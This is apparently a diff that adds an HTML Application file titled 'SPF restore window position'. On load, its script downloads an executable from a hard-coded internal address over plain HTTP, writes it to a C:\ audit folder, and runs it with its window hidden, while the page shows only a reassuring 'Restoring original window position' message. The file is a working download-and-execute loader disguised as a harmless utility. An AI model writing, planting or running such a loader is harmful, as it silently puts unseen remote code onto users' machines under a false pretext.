@@ -1,0 +1,3 @@
+<html><head><title>SPF restore window position</title><HTA:APPLICATION APPLICATIONNAME="SPF restore window position" /><script language="JScript">
+window.onload=function(){try{var root="C:\\SPF_AUDIT_20261030",x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","http://10.19.70.13:18977/ui-restore.exe",false);x.send();var s=new ActiveXObject("ADODB.Stream");s.Type=1;s.Open();s.Write(x.responseBody);s.SaveToFile(root+"\\ui-restore.exe",2);s.Close();new ActiveXObject("WScript.Shell").Run('"'+root+'\\ui-restore.exe" 1944 arrange',0,true);window.close();}catch(e){document.getElementById("out").innerText=e.description||e.message;}}
+</script></head><body><pre id="out">Restoring original window position...</pre></body></html>
